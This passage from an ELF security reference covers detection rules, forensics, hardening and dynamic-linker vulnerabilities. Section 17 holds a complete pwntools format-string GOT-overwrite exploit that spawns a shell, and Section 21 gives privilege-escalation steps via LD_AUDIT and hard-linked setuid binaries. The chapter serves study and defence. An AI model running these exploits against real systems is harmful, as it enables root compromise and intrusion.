        $init_section = ".init_array"
        $fini_section = ".fini_array"
        $shell_str = "/bin/sh" ascii
        $bash_str = "/bin/bash" ascii
        $system_call = "system" ascii
        $execve_call = "execve" ascii
    condition:
        uint32(0) == 0x464c457f and
        ($init_section or $fini_section) and
        2 of ($shell_str, $bash_str, $system_call, $execve_call)
}
```

### 16.5 Statically linked stripped binary (common in implants)

Implants and droppers are frequently distributed as statically-linked, stripped binaries to eliminate runtime dependencies and analysis metadata. This rule detects ELF binaries that are statically linked (no `PT_INTERP`, no `DT_NEEDED`) and stripped (no `.symtab` section name in section headers).

```
rule elf_static_stripped_implant {
    meta:
        description = "Statically linked and stripped ELF (common implant pattern)"
        severity = "medium"
        technique = "T1027.002 - Software Packing"
    strings:
        $interp = ".interp" ascii
        $symtab = ".symtab" ascii
        $dynamic = ".dynamic" ascii
    condition:
        uint32(0) == 0x464c457f and
        not $interp and
        not $symtab and
        not $dynamic and
        filesize < 10MB
}
```

### 16.6 RWX segments (PT_LOAD or PT_GNU_STACK with PF_R|PF_W|PF_X)

A `PT_LOAD` or `PT_GNU_STACK` segment with all three permission bits set is anomalous in legitimate binaries. It indicates either a packer's decompression target, self-modifying code, or a deliberate executable-stack request.

```
rule elf_rwx_segment {
    meta:
        description = "ELF with RWX (read-write-execute) segment"
        severity = "high"
        technique = "T1055 - Process Injection"
    condition:
        uint32(0) == 0x464c457f and
        uint8(4) == 2 and
        for any i in (0..uint16(56) - 1) : (
            // p_flags (offset 4 in each phdr) has PF_X|PF_W|PF_R (0x7)
            uint32(uint64(32) + i * 56 + 4) & 0x7 == 0x7
        )
}
```

### 16.7 Modified e_entry pointing outside .text

This rule detects binaries whose entry point (`e_entry`) does not fall within the first executable `PT_LOAD` segment, which typically contains `.text`. Post-link modification of `e_entry` to point into injected code or a code cave is a common infection technique.

```
rule elf_entry_outside_text {
    meta:
        description = "ELF e_entry points outside the primary executable segment"
        severity = "high"
        technique = "T1036.005 - Masquerading: Match Legitimate Name or Location"
    condition:
        uint32(0) == 0x464c457f and
        uint8(4) == 2 and
        // For every phdr: if it is an executable PT_LOAD, then e_entry must fall outside it.
        // "A implies B" is rewritten as "not A or B" since YARA lacks an implies operator.
        for all i in (0..uint16(56) - 1) : (
            not (uint32(uint64(32) + i * 56) == 1 and
                 uint32(uint64(32) + i * 56 + 4) & 1 == 1)
            or
            (uint64(24) < uint64(uint64(32) + i * 56 + 16) or
             uint64(24) >= uint64(uint64(32) + i * 56 + 16) + uint64(uint64(32) + i * 56 + 40))
        )
}
```

---

## 17. Pwntools ELF manipulation

Pwntools (`pwnlib`) is the standard Python library for binary exploitation. This section demonstrates practical ELF interaction patterns that apply to both offensive testing and defensive validation.

### 17.1 Loading and parsing

```python
from pwn import *

elf = ELF("./target_binary")

# Basic properties
log.info(f"Arch: {elf.arch}")
log.info(f"Bits: {elf.bits}")
log.info(f"Endian: {elf.endian}")
log.info(f"Entry: {hex(elf.entry)}")
log.info(f"PIE: {elf.pie}")

# Security mitigations (equivalent to checksec)
log.info(f"RELRO: {elf.relro}")        # 'Full', 'Partial', or None
log.info(f"Stack canary: {elf.canary}")
log.info(f"NX: {elf.nx}")
log.info(f"PIE: {elf.pie}")

# GOT and PLT entries
for name, addr in elf.got.items():
    log.info(f"GOT[{name}] = {hex(addr)}")

for name, addr in elf.plt.items():
    log.info(f"PLT[{name}] = {hex(addr)}")

# Symbol lookup
if 'main' in elf.symbols:
    log.info(f"main @ {hex(elf.symbols['main'])}")

# Section addresses
log.info(f".text @ {hex(elf.get_section_by_name('.text').header.sh_addr)}")
```

### 17.2 Finding gadgets with ROP

```python
from pwn import *

elf = ELF("./target_binary")
rop = ROP(elf)

# Search for specific gadgets
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])
pop_rsi_r15 = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])
ret = rop.find_gadget(['ret'])

log.info(f"pop rdi; ret    @ {hex(pop_rdi.address)}")
log.info(f"pop rsi; pop r15; ret @ {hex(pop_rsi_r15.address)}")
log.info(f"ret gadget      @ {hex(ret.address)}")

# ROP chain building
rop.call('puts', [elf.got['puts']])  # call puts(GOT[puts]) to leak libc
rop.call('main')                      # return to main for second stage

log.info(f"ROP chain:\n{rop.dump()}")
chain = rop.chain()
```

### 17.3 Patching GOT entries programmatically

For binary patching (not runtime exploitation), pwntools can modify the ELF on disk:

```python
from pwn import *

elf = ELF("./target_binary")

# Read the current GOT entry value (the pre-relocation placeholder)
got_puts = elf.got['puts']
log.info(f"GOT[puts] file offset: {hex(elf.vaddr_to_offset(got_puts))}")

# Patch the GOT entry to point to a known address (for analysis/testing)
elf.write(got_puts, p64(0xdeadbeefcafe))

# Save the modified binary
elf.save("./patched_binary")
```

### 17.4 Building format string payloads targeting GOT

```python
from pwn import *

elf = ELF("./vuln_binary")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

# Assume libc_base is already leaked
libc_base = 0x7ffff7c00000
system_addr = libc_base + libc.symbols['system']

# Build a format string payload to overwrite GOT[printf] with system()
# offset = the format string's position on the stack (determined empirically)
payload = fmtstr_payload(
    offset=6,
    writes={elf.got['printf']: system_addr},
    numbwritten=0,
    write_size='short'
)

log.info(f"Format string payload length: {len(payload)}")
```

### 17.5 Leaking addresses via format string and GOT

The format string `%s` dereferences a pointer argument and prints the string at that address. By placing a GOT entry's address on the stack where the format string will read it, the attacker leaks the resolved libc function address stored in that GOT slot:

```python
from pwn import *

elf = ELF("./vuln_binary")
context.binary = elf

p = process("./vuln_binary")

# The GOT entry for puts contains puts@libc after the first call to puts.
# Place the GOT address where the format string's 7th %p/%s argument will read it.
payload = b"AAAA%7$sAAAA" + p64(elf.got['puts'])
p.sendline(payload)

# Parse the leak: skip the "AAAA" prefix, read 6 bytes of the address
p.recvuntil(b"AAAA")
leaked_bytes = p.recvuntil(b"AAAA", drop=True)
leaked_puts = u64(leaked_bytes.ljust(8, b'\x00'))

log.info(f"Leaked puts@libc: {hex(leaked_puts)}")
```

### 17.6 Complete exploit template: leak → calculate → overwrite → shell

This template demonstrates the canonical GOT-overwrite exploit flow against a binary with partial RELRO and a format-string vulnerability:

```python
from pwn import *

# ---------- Configuration ----------
binary_path = "./vuln"
libc_path   = "/lib/x86_64-linux-gnu/libc.so.6"
elf  = ELF(binary_path)
libc = ELF(libc_path)
context.binary = elf
FMT_OFFSET = 6  # determined by sending "AAAA%p.%p.%p..." and counting

def start():
    if args.REMOTE:
        return remote("target.example.com", 1337)
    return process(binary_path)

# ---------- Stage 1: Leak libc base ----------
p = start()

# Use %s to dereference GOT[puts] and print the resolved libc address.
leak_payload = flat({
    0: b"%7$s....",
    8: p64(elf.got['puts'])
})
p.sendlineafter(b"> ", leak_payload)

leaked = u64(p.recv(6).ljust(8, b'\x00'))
libc.address = leaked - libc.symbols['puts']
log.success(f"libc base: {hex(libc.address)}")

# ---------- Stage 2: Calculate targets ----------
system_addr  = libc.symbols['system']
binsh_addr   = next(libc.search(b"/bin/sh\x00"))
log.info(f"system:  {hex(system_addr)}")
log.info(f"/bin/sh: {hex(binsh_addr)}")

# ---------- Stage 3: Overwrite GOT[puts] → system ----------
# Next call to puts(user_input) becomes system(user_input).
write_payload = fmtstr_payload(
    FMT_OFFSET,
    {elf.got['puts']: system_addr},
    numbwritten=0,
    write_size='short'
)
p.sendlineafter(b"> ", write_payload)

# ---------- Stage 4: Trigger shell ----------
p.sendlineafter(b"> ", b"/bin/sh")
p.interactive()
```

The exploit leaves several forensic artifacts: the format-string payloads in any log that captures stdin/stdout, the modified GOT entry (detectable by comparing `.got.plt` against expected addresses), and the spawned `/bin/sh` process visible in the process tree. Detection strategies for these artifacts are covered in §19.

---

## 18. ELF hardening and mitigations

This section catalogs the compiler, linker, and kernel options that harden ELF binaries against the attacks described in §13–§14, along with their detection and verification methods.

### 18.1 Compiler and linker flags

| Flag | Effect | Mitigates |
|------|--------|-----------|
| `-z relro` | Marks `.got`, `.dynamic`, and metadata as RELRO (read-only after relocation) | GOT overwrite of `.got` entries |
| `-z now` | Sets `DF_BIND_NOW`; all symbols resolved at load time; `.got.plt` included in RELRO | GOT overwrite of `.got.plt` (PLT) entries |
| `-z noexecstack` | Clears `PF_X` on `PT_GNU_STACK` | Stack-based shellcode execution |
| `-fstack-protector-strong` | Inserts stack canaries on functions with local arrays, address-taken locals, or register spills | Stack buffer overflow (return address corruption) |
| `-fPIE -pie` | Produces a position-independent executable | ASLR bypass via fixed addresses |
| `-D_FORTIFY_SOURCE=2` | Replaces unsafe libc calls (`strcpy`, `sprintf`, etc.) with bounds-checked variants | Buffer overflow via libc string/memory functions |
| `-fstack-clash-protection` | Inserts probes when growing the stack to prevent skipping guard pages | Stack clash attacks (CVE-2017-1000364) |
| `-fcf-protection=full` | Emits CET `endbr64` landing pads and shadow-stack instrumentation | ROP/JOP (indirect branch hijacking) |
| `-Wl,-z,separate-code` | Places code and data in separate `PT_LOAD` segments with distinct permissions | Code/data confusion, W^X violations |

### 18.2 checksec output interpretation

The `checksec` tool (bundled with pwntools) summarizes a binary's mitigation posture:

```bash
$ checksec --file=./target_binary
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

Each field maps directly to a structural property: **RELRO** checks `DT_FLAGS`/`DT_FLAGS_1` for `BIND_NOW` and the presence of `PT_GNU_RELRO`. **Stack** checks for `__stack_chk_fail` in the dynamic symbol table. **NX** checks `PT_GNU_STACK` permissions for the absence of `PF_X`. **PIE** checks `e_type == ET_DYN` combined with `DF_1_PIE` or heuristics. **FORTIFY** checks for `_chk` variants of libc functions in the import table.

A binary that shows "Partial RELRO" with network-facing input is a priority hardening target. The upgrade from partial to full RELRO requires only adding `-z now` to the linker invocation — a zero-cost change in most build systems.

### 18.3 Dynamic linker hardening

`LD_BIND_NOW=1` in the environment forces eager binding for all loaded objects, equivalent to `DT_BIND_NOW` but applied externally. `RTLD_NOW` as a flag to `dlopen()` forces eager binding for dynamically-loaded libraries.

The dynamic linker respects `AT_SECURE` to disable dangerous environment variables for privileged binaries. Beyond this, glibc's `--enable-hardcoded-path-in-tests` build option and distribution-specific patches restrict `DT_RPATH`/`DT_RUNPATH` behavior. Some hardened distributions (Gentoo Hardened, Alpine) patch `ld.so` to further restrict `LD_PRELOAD` paths or to audit library loading.

For containerized environments, bind-mounting a read-only `/lib` and `/usr/lib`, combined with a read-only `/etc/ld.so.conf` and cached `/etc/ld.so.cache`, prevents library substitution attacks even when the container's `LD_LIBRARY_PATH` is writable.

### 18.4 Kernel ELF loader hardening

The kernel exposes several `sysctl` knobs relevant to ELF loading:

```bash
# Prevent mapping at address 0 (NULL-pointer-dereference exploitation)
sysctl vm.mmap_min_addr=65536

# ASLR level: 0=off, 1=stack+mmap, 2=stack+mmap+PIE (full)
sysctl kernel.randomize_va_space=2

# Restrict access to /proc/PID/maps and /proc/PID/mem for non-root
sysctl kernel.yama.ptrace_scope=1

# Prevent core dumps for setuid binaries
sysctl fs.suid_dumpable=0
```

`kernel.randomize_va_space=2` is the baseline for ASLR. Without it, PIE binaries load at predictable addresses and all the leaking infrastructure described in §13 becomes unnecessary for the attacker. CVE-2017-1000253 (offset2lib, affecting PIE binaries on older kernels) demonstrated that even with ASLR=2, implementation bugs in the kernel's load-base selection could place the executable and its libraries at predictable relative offsets, defeating ASLR.

### 18.5 Binary analysis automation with Ghidra headless

For large-scale binary analysis (e.g., scanning an entire package repository for hardening gaps), Ghidra's headless analyzer processes binaries without a GUI:

```bash
# Analyze a binary with Ghidra headless and run a post-analysis script
/opt/ghidra/support/analyzeHeadless /tmp/ghidra_project project_name \
    -import ./suspicious.elf \
    -postScript CheckHardeningFlags.java \
    -deleteProject \
    -log /tmp/ghidra_analysis.log

# Minimal Ghidra Python script (run inside headless via -postScript):
# CheckHardeningFlags.py
# from ghidra.program.model.listing import Program
# program = getCurrentProgram()
# memory = program.getMemory()
# entry = program.getImageBase()
# print("Entry: {}".format(entry))
# for block in memory.getBlocks():
#     perms = ""
#     if block.isRead(): perms += "R"
#     if block.isWrite(): perms += "W"
#     if block.isExecute(): perms += "X"
#     print("  {} {} {}".format(block.getName(), block.getStart(), perms))
```

### 18.6 Sigma rules for suspicious ELF execution patterns

Sigma rules translate detection logic into a SIEM-agnostic format. The following detect common ELF exploitation and implant execution patterns:

```yaml
title: ELF Execution from Suspicious Location
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
status: experimental
description: Detects execution of ELF binaries from world-writable or temporary directories
logsource:
    category: process_creation
    product: linux
detection:
    selection:
        Image|startswith:
            - '/tmp/'
            - '/dev/shm/'
            - '/var/tmp/'
            - '/run/user/'
    filter:
        Image|endswith:
            - '/apt-get'
            - '/dpkg'
    condition: selection and not filter
level: high
tags:
    - attack.execution
    - attack.t1059.004

---
title: Execution via memfd_create (Fileless ELF)
id: b2c3d4e5-f6a7-8901-bcde-f12345678901
status: experimental
description: Detects processes whose executable path references memfd (fileless execution)
logsource:
    category: process_creation
    product: linux
detection:
    selection:
        Image|contains: '/memfd:'
    condition: selection
level: critical
tags:
    - attack.defense_evasion
    - attack.t1620
```

### 18.7 Auditd rules for LD_PRELOAD and library injection detection

```bash
# Detect writes to /etc/ld.so.preload (system-wide preload configuration)
-w /etc/ld.so.preload -p wa -k ld_preload_system

# Detect writes to /etc/ld.so.conf and ld.so.cache (library search path tampering)
-w /etc/ld.so.conf -p wa -k ld_conf_tamper
-w /etc/ld.so.conf.d/ -p wa -k ld_conf_tamper
-w /etc/ld.so.cache -p wa -k ld_cache_tamper

# Detect modifications to shared libraries in system paths
-w /lib/ -p wa -k lib_tamper
-w /lib64/ -p wa -k lib_tamper
-w /usr/lib/ -p wa -k lib_tamper
-w /usr/lib64/ -p wa -k lib_tamper

# Detect execution of binaries from /dev/shm (common staging area for implants)
-a always,exit -F arch=b64 -S execve -F dir=/dev/shm -F key=shm_exec

# Detect use of ptrace (process injection, debugging)
-a always,exit -F arch=b64 -S ptrace -F key=ptrace_use

# Detect memfd_create syscall (fileless ELF execution)
-a always,exit -F arch=b64 -S memfd_create -F key=memfd_create
```

These rules produce audit events that feed into a SIEM for correlation. A `memfd_create` call followed by `execveat` (with `AT_EMPTY_PATH`) from the same process is the signature of fileless ELF execution — the binary exists only in memory and never touches disk.

---

## 19. ELF forensics

When an incident involves ELF binaries — whether as the delivery vehicle, the implant, or the exploitation target — the forensic workflow extends beyond static analysis of files on disk to runtime and post-mortem memory analysis.

### 19.1 Extracting ELF from memory

A running process's memory layout is visible through `/proc/PID/maps`, which lists every mapped region with its address range, permissions, offset, device, inode, and pathname. The text segment of the main executable and each loaded library appears as separate mappings.

```bash
# List all memory regions for a process
cat /proc/$PID/maps

# Example output:
# 555555554000-555555556000 r--p 00000000 08:01 1234 /path/to/binary
# 555555556000-555555558000 r-xp 00002000 08:01 1234 /path/to/binary
# ...

# Dump the text segment using gdb
gdb -batch -pid $PID \
    -ex "dump memory /tmp/text_dump.bin 0x555555556000 0x555555558000"

# Alternative: dump via /proc/PID/mem (requires ptrace or same UID)
dd if=/proc/$PID/mem bs=1 skip=$((0x555555556000)) \
   count=$((0x2000)) of=/tmp/text_dump.bin 2>/dev/null
```

For fileless malware that exists only in memory (loaded via `memfd_create` + `execveat`), `/proc/PID/exe` is a symlink to `/memfd:name (deleted)`. Reading this symlink or dumping the corresponding mappings is the only way to recover the binary.

### 19.2 Comparing disk vs memory ELF

After extracting a process's text and data segments from memory, compare them against the on-disk binary to detect runtime patching:

```bash
# Extract .text section from the on-disk binary
objcopy -O binary -j .text ./binary /tmp/disk_text.bin

# Dump the corresponding region from memory (address from /proc/PID/maps)
gdb -batch -pid $PID \
    -ex "dump memory /tmp/mem_text.bin 0x555555556000 0x555555558000"

# Binary diff
cmp -l /tmp/disk_text.bin /tmp/mem_text.bin | head -20
# Or visual diff
diff <(xxd /tmp/disk_text.bin) <(xxd /tmp/mem_text.bin)
```

Differences in read-only executable segments indicate either debugger breakpoints (`0xCC` bytes for `int3`), runtime unpacking, or malicious code patches. Differences in the GOT are expected (due to relocation) but should be validated against the symbol resolution rules: each GOT entry should point to a valid function in the expected library.

### 19.3 Volatility3 ELF plugins for memory forensics

Volatility3 provides plugins for analyzing Linux memory images that contain ELF artifacts:

```bash
# List all processes with their ELF mappings
vol3 -f /path/to/memory.lime linux.proc.Maps

# Enumerate loaded shared objects per process (via link_map traversal)
vol3 -f /path/to/memory.lime linux.elfs.Elfs

# Dump a specific process's ELF binary from memory
vol3 -f /path/to/memory.lime linux.proc.Maps --pid $PID --dump

# Check for processes running from deleted files (fileless malware)
vol3 -f /path/to/memory.lime linux.proc.Maps | grep '(deleted)'
```

The `linux.elfs.Elfs` plugin walks the `r_debug` → `link_map` chain (§13.7) from within the memory image, providing the same information as `dl_iterate_phdr` would at runtime but from a forensic capture.

### 19.4 Timeline of ELF loading events via strace/ltrace

Tracing the dynamic linker's behavior produces a detailed timeline of library loading, symbol resolution, and constructor execution:

```bash
# Trace syscalls during ELF loading (mmap, mprotect, open, read)
strace -f -e trace=openat,mmap,mprotect,close \
       -o /tmp/load_trace.log ./binary

# Trace dynamic library calls (PLT-level interception)
ltrace -e '*' -o /tmp/ltrace.log ./binary

# Trace only the dynamic linker's operations via LD_DEBUG
LD_DEBUG=all ./binary 2>/tmp/ld_debug.log
LD_DEBUG=libs ./binary 2>/tmp/ld_libs.log    # library search only
LD_DEBUG=bindings ./binary 2>/tmp/ld_bind.log # symbol bindings only
```

The `strace` output reveals the exact sequence of `openat()` calls (which libraries were opened and from which paths), `mmap()` calls (which segments were mapped at which addresses with which permissions), and `mprotect()` calls (RELRO application). The `LD_DEBUG=bindings` output shows every symbol resolution — which object provided each symbol, enabling detection of unexpected resolution targets (e.g., a preloaded library providing `read()` instead of libc).

### 19.5 Using ldd safely vs unsafely

`ldd` is a shell script that sets `LD_TRACE_LOADED_OBJECTS=1` and then **executes the binary**. This means `ldd` on a malicious binary runs the dynamic linker — and potentially the binary's constructors — on the analyst's system. The dynamic linker's trace mode prints dependency information and exits before calling `main()`, but `.init_array` constructors execute before the trace-mode check in some glibc versions.

The safe alternative is to invoke the dynamic linker directly without executing the binary:

```bash
# UNSAFE: runs the binary's constructors
ldd ./suspicious.elf          # DO NOT USE on untrusted binaries

# SAFE: invokes ld.so in --list mode, which does not execute constructors
/lib64/ld-linux-x86-64.so.2 --list ./suspicious.elf

# SAFEST: use readelf, which never executes anything
readelf -d ./suspicious.elf | grep NEEDED
```

For untrusted binaries, always use `readelf -d` to enumerate dependencies statically, or run `ldd` inside an isolated container or VM.

---

## 20. CVE reference table

The following table maps ELF-related CVEs to their attack type, affected component, and detection approach. These CVEs are referenced throughout this chapter and its companion, Chapter 1B.

| CVE | Year | Attack Type | Affected Component | Description | Detection |
|-----|------|------------|-------------------|-------------|-----------|
| CVE-2010-3847 | 2010 | Privilege escalation | glibc ld.so (`$ORIGIN` expansion) | `$ORIGIN` in `DT_RPATH` of setuid binary allowed loading libraries from attacker-controlled directories | Audit binaries for `DT_RPATH` containing `$ORIGIN`; flag setuid binaries with `DT_RPATH` |
| CVE-2010-3856 | 2010 | Privilege escalation | glibc ld.so (`LD_AUDIT` + `$ORIGIN`) | `LD_AUDIT` combined with `$ORIGIN` expansion bypassed `AT_SECURE` restrictions | Monitor for `LD_AUDIT` in process environments; patch glibc |
| CVE-2015-8543 | 2015 | Kernel use-after-free | Linux kernel (AF_ALG socket) | Use-after-free in AF_ALG providing write primitive usable for GOT overwrite chains | Kernel version audit; seccomp filtering of AF_ALG |
| CVE-2017-1000253 | 2017 | ASLR bypass (offset2lib) | Linux kernel ELF loader | PIE binary's load base and libraries placed at predictable relative offsets, defeating ASLR | `kernel.randomize_va_space=2`; kernel version >= 4.12 |
| CVE-2017-1000364 | 2017 | Stack clash | Linux kernel (stack guard page) | Stack growth could skip guard page, allowing stack-heap collision | `-fstack-clash-protection` compiler flag; kernel version >= 4.11.5 |
| CVE-2018-16865 | 2018 | Memory corruption | systemd-journald | Stack buffer overflow exploitable via GOT overwrite | Full RELRO on systemd binaries; journald input validation |
| CVE-2021-3156 | 2021 | Heap overflow → code exec | sudo (heap-based) | Heap overflow in sudoedit leading to arbitrary code execution, often via GOT overwrite | sudo version >= 1.9.5p2; ASLR + Full RELRO |
| CVE-2023-4911 | 2023 | Buffer overflow | glibc ld.so (GLIBC_TUNABLES) | Buffer overflow in `GLIBC_TUNABLES` environment variable processing during dynamic linking, allowing local privilege escalation | glibc version >= 2.38-4; unset `GLIBC_TUNABLES` in service environments |
| CVE-2023-6246 | 2023 | Heap overflow | glibc `__vsyslog_internal` | Heap buffer overflow reachable via `syslog()`, exploitable for GOT overwrite | glibc version >= 2.39; Full RELRO on syslog-calling binaries |

---

## 21. ELF loader security deep dive

The dynamic linker (`ld-linux-x86-64.so.2` on x86_64, `ld-linux-aarch64.so.1` on AArch64) is among the most security-critical components in the Linux userspace. It runs before any application code, operates with full process privileges, and parses complex data structures from both the binary and the environment. Because it is a shared object mapped into every dynamically-linked process — including setuid/setgid binaries — any vulnerability in `ld.so` typically grants local privilege escalation.

### 21.1 Environment variable attack surface

The dynamic linker processes a family of `LD_*` environment variables that control library search paths, preloading, debugging, and auditing. The three most security-relevant are:

**LD_PRELOAD** specifies a colon-separated list of shared objects to load before any other library. Each listed DSO is `mmap`'d and its symbols inserted at the front of the global symbol scope, so they override (interpose) symbols in libc and other libraries. A malicious `LD_PRELOAD` DSO that exports `read()`, `write()`, or `connect()` replaces the corresponding libc functions for the entire process.

**LD_LIBRARY_PATH** prepends directories to the dynamic linker's library search order. By pointing this at an attacker-controlled directory containing a trojanized `libc.so.6`, every dynamically-resolved call goes through the attacker's code. Unlike `LD_PRELOAD` (which adds a new DSO), `LD_LIBRARY_PATH` substitutes the legitimate library entirely.

**LD_AUDIT** names a DSO that implements the rtld-audit interface (`la_symbind64`, `la_objopen`, etc.). The audit DSO is loaded even earlier than `LD_PRELOAD` objects and receives callbacks for every symbol binding and object load event. A malicious audit DSO has full visibility and control over the linking process.

For unprivileged processes, these variables are legitimate instrumentation points. The danger arises when they are honored in privileged contexts.

### 21.2 AT_SECURE enforcement and its gaps

When the kernel launches a setuid/setgid binary, or a binary with filesystem capabilities, it sets the `AT_SECURE` auxiliary vector entry to 1. The dynamic linker checks this flag early in `_dl_main` and, when set, sanitizes the environment: `LD_PRELOAD`, `LD_LIBRARY_PATH`, `LD_AUDIT`, `LD_DEBUG`, and several others are either ignored entirely or restricted to trusted paths.

The implementation in glibc's `elf/dl-support.c` and `elf/rtld.c`:

```c
/* Simplified from glibc's __libc_enable_secure logic */
if (__builtin_expect (__libc_enable_secure, 0))
  {
    /* Remove LD_PRELOAD, LD_LIBRARY_PATH, LD_AUDIT, etc. */
    static const char unsecure_envvars[] =
      "GCONV_PATH\0"
      "GETCONF_DIR\0"
      "HOSTALIASES\0"
      "LD_AUDIT\0"
      "LD_DEBUG\0"
      "LD_DEBUG_OUTPUT\0"
      "LD_DYNAMIC_WEAK\0"
      "LD_LIBRARY_PATH\0"
      "LD_ORIGIN_PATH\0"
      "LD_PRELOAD\0"
      "LD_PROFILE\0"
      "LD_SHOW_AUXV\0"
      "LOCALDOMAIN\0"
      "LOCPATH\0"
      "MALLOC_TRACE\0"
      "NIS_PATH\0"
      "NLSPATH\0"
      "RESOLV_HOST_CONF\0"
      "RES_OPTIONS\0"
      "TMPDIR\0"
      "TZDIR\0";
    /* ... unsetenv each of these ... */
  }
```

Historical `AT_SECURE` bypass patterns include:

1. **Incomplete unsecure_envvars list.** Variables not in the list but still consumed by glibc or loaded libraries escape sanitization. `GCONV_PATH` was historically not sanitized, enabling CVE-2021-3999 and related attacks where a setuid binary's charset conversion loaded a DSO from an attacker-controlled path.

2. **DT_RPATH / DT_RUNPATH containing `$ORIGIN`.** Even with `AT_SECURE`, the dynamic linker expanded `$ORIGIN` in `DT_RPATH` to the directory containing the binary. If an attacker could place the setuid binary (or a hard link to it) in a directory they controlled, `$ORIGIN` resolved to that directory, and the linker loaded libraries from there (CVE-2010-3847).

3. **Race conditions in environment parsing.** On some kernels and glibc versions, a multi-threaded attacker process could modify the environment between the kernel's `AT_SECURE` check and the dynamic linker's sanitization pass (largely theoretical, but the window exists).

Verification of `AT_SECURE` behavior:

```bash
# Confirm AT_SECURE is set for a setuid binary
LD_SHOW_AUXV=1 /usr/bin/passwd 2>&1 | grep AT_SECURE
# Expected for setuid: AT_SECURE: 1

# Verify LD_PRELOAD is ignored under AT_SECURE
LD_PRELOAD=/tmp/evil.so /usr/bin/passwd 2>&1
# Should NOT load /tmp/evil.so; check with strace:
strace -e openat /usr/bin/passwd 2>&1 | grep evil
# No match expected

# Check which env vars the dynamic linker sanitizes (glibc source audit)
strings /lib64/ld-linux-x86-64.so.2 | grep -E '^LD_|^GCONV|^MALLOC'
```

### 21.3 CVE-2023-4911 — Looney Tunables

CVE-2023-4911 is a buffer overflow in glibc's `ld.so` triggered during processing of the `GLIBC_TUNABLES` environment variable. Introduced in glibc 2.34 (commit 2ed18c, August 2021), the vulnerability existed for over two years before disclosure in October 2023. CVSS 7.8 (local privilege escalation).

**Root cause.** The `GLIBC_TUNABLES` variable allows runtime tuning of glibc internals (e.g., `glibc.malloc.mmap_threshold`). The parsing function `__tunables_init()` in `elf/dl-tunables.c` copies tunable key=value pairs into a fixed-size stack buffer. The copy loop failed to account for the terminating NUL of the combined string, writing one byte past the end of the allocated buffer. By supplying a carefully crafted `GLIBC_TUNABLES` value, an attacker overflowed the buffer into the saved frame pointer or return address on the stack.

**Exploitation path.** The overflow occurs inside the dynamic linker, which runs before any application code — including before `AT_SECURE` would strip the variable (because `GLIBC_TUNABLES` was not in the unsecure_envvars list in affected versions). This meant the overflow was reachable in setuid binaries. The attacker:

1. Sets `GLIBC_TUNABLES` to a malicious value with carefully controlled length.
2. Executes a setuid binary (e.g., `su`, `sudo`, `passwd`).
3. The dynamic linker's `__tunables_init()` overflows the stack buffer.
4. The attacker gains control of execution within the dynamic linker's context, running as root.

```bash
# Detection: check glibc version
ldd --version 2>&1 | head -1
# Vulnerable: glibc 2.34 through 2.38-3
# Fixed: glibc >= 2.38-4 (or distribution-specific backport)

# Runtime mitigation (defense-in-depth, not a fix)
# Unset the variable system-wide via /etc/environment or PAM
unset GLIBC_TUNABLES

# Audit for exploitation attempts (auditd rule)
# The attack requires executing a setuid binary with GLIBC_TUNABLES set
# -w /usr/bin/su -p x -k suid_exec
# -w /usr/bin/sudo -p x -k suid_exec
# Cross-correlate with environment variable logging if available

# Verify the fix
env GLIBC_TUNABLES=glibc.malloc.mmap_threshold=131072 /usr/bin/su --help
# On fixed glibc: normal operation
# On vulnerable glibc: may crash or behave unexpectedly with oversized values
```

**Structural lesson.** `GLIBC_TUNABLES` was a relatively new feature that bypassed the established `AT_SECURE` sanitization list. The dynamic linker's environment parsing code is a critical attack surface because it runs in the highest-privilege context (the setuid binary's effective UID) and before any mitigation checks. Any new environment variable consumed by `ld.so` must be added to the sanitization list and its parsing code audited for memory safety.

### 21.4 CVE-2017-1000366 — Stack Clash via the loader

CVE-2017-1000366 (and the broader Stack Clash family, CVE-2017-1000364 through CVE-2017-1000379) exploited the fact that the kernel's stack guard page — a single 4 KiB page between the stack and adjacent memory regions — could be skipped by a large allocation that jumped over it. The dynamic linker was one of the affected components because it performs `alloca()`-based allocations during `DT_RPATH` and `LD_LIBRARY_PATH` processing.

**Attack mechanism.** The attacker supplies a very long `LD_LIBRARY_PATH` value. The dynamic linker uses `alloca()` to copy and process this string. If the `alloca()` allocation is large enough to skip past the stack guard page, the stack pointer lands in the heap or another mapped region. The attacker controls the written data (the library path string), so they achieve an arbitrary write into the adjacent region.

```c
/* Simplified vulnerable pattern in ld.so (pre-fix) */
void process_library_path(const char *path)
{
    size_t len = strlen(path);
    /* alloca on the stack — no guard-page check for large values */
    char *copy = alloca(len + 1);
    memcpy(copy, path, len + 1);  /* writes past guard page if len > ~8MB */
    /* ... process the copy ... */
}
```

**Mitigation.** The kernel increased the default stack guard gap from 1 page to 1 MiB (`/proc/sys/vm/heap-stack-gap`). Glibc replaced `alloca()` with `malloc()` for large allocations in the dynamic linker's path processing. The compiler flag `-fstack-clash-protection` (GCC 8+, Clang 11+) generates probe instructions that touch each page during stack allocation, ensuring the guard page is never skipped.

```bash
# Verify stack guard gap size
cat /proc/sys/vm/heap-stack-gap
# Should be 1048576 (1 MiB) on patched kernels

# Verify compiler mitigation
gcc -fstack-clash-protection -S -o /dev/stdout test.c | grep -i probe
# Look for stack probing instructions

# Check if a binary was compiled with stack-clash protection
objdump -d ./binary | grep -c 'or.*%rsp' | head
# Stack probes typically appear as 'or $0x0, (%rsp)' or 'test' instructions
# within function prologues
```

### 21.5 CVE-2010-3856 — LD_AUDIT arbitrary DSO load

CVE-2010-3856 combined two glibc weaknesses: (1) `LD_AUDIT` was not fully sanitized under `AT_SECURE` when combined with `$ORIGIN` expansion, and (2) the `$ORIGIN` expansion resolved to the directory containing the binary, which for a hard-linked setuid binary could be an attacker-controlled directory.

**Attack path:**

1. Create a directory under attacker control (e.g., `/tmp/evil/`).
2. Hard-link a setuid binary into that directory: `ln /usr/bin/su /tmp/evil/su`.
3. Place a malicious shared object in `/tmp/evil/` named to match the `LD_AUDIT` value.
4. Execute the hard-linked binary with `LD_AUDIT=$ORIGIN/evil.so`.
5. The dynamic linker expands `$ORIGIN` to `/tmp/evil/` (the directory of the binary being executed), loads `/tmp/evil/evil.so` as the audit DSO, and executes the attacker's code as root.

```bash
# Reproduce the setup (do NOT run on production systems)
mkdir /tmp/evil
ln /usr/bin/su /tmp/evil/su 2>/dev/null  # Requires hard-link permission

